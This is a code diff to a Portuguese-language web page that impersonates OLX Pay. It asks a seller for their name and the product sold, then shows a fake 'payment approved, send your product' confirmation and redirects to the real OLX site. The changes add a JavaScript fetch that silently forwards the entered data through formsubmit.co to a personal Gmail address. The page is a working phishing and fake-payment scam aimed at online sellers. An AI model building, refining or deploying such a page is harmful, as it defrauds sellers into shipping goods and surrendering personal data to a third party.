@@ -70,7 +70,7 @@
 
   <h2>Confirmação de Venda - OLX Pay</h2>
 
-  <form id="vendaForm" action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST" onsubmit="mostrarConfirmacao(); return true;">
+  <form id="vendaForm">
     <label for="nome">Seu nome completo:</label>
     <input type="text" id="nome" name="nome" required>
 
@@ -80,16 +80,13 @@
     <label for="produto">Produto vendido:</label>
     <input type="text" id="produto" name="produto" required>
 
-    <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_next" value="https://www.olx.com.br/">
-
     <button type="submit" class="btn">Confirmar venda</button>
   </form>
 
   <div id="confirmacao" class="confirmacao hidden">
     <h3>Pagamento aprovado – envie seu produto</h3>
     <p>Parabéns! Você realizou uma venda com sucesso através do OLX Pay.</p>
-    <p><strong>Produto vendido:</strong> Produto informado</p>
+    <p><strong>Produto vendido:</strong> <span id="produtoInfo"></span></p>
     <p><strong>Valor:</strong> R$ 350,00</p>
     <p><strong>Forma de envio:</strong> Correios (frete pago)</p>
     <p><strong>Código de postagem:</strong> BR345671234BR</p>
@@ -99,12 +96,30 @@
   </div>
 
   <script>
-    function mostrarConfirmacao() {
-      setTimeout(() => {
+    document.getElementById("vendaForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+      const form = e.target;
+      const dados = new FormData(form);
+
+      // Envia para FormSubmit
+      fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
+        method: "POST",
+        headers: { 'Accept': 'application/json' },
+        body: dados,
+      }).then(() => {
+        // Preenche produto na confirmação
+        document.getElementById("produtoInfo").innerText = form.produto.value;
+
+        // Mostra tela de confirmação
         document.getElementById('vendaForm').classList.add('hidden');
         document.getElementById('confirmacao').classList.remove('hidden');
-      }, 500);
-    }
+
+        // Redireciona após 5 segundos
+        setTimeout(() => {
+          window.location.href = "https://www.olx.com.br/";
+        }, 5000);
+      });
+    });
   </script>
 </body>
 </html>
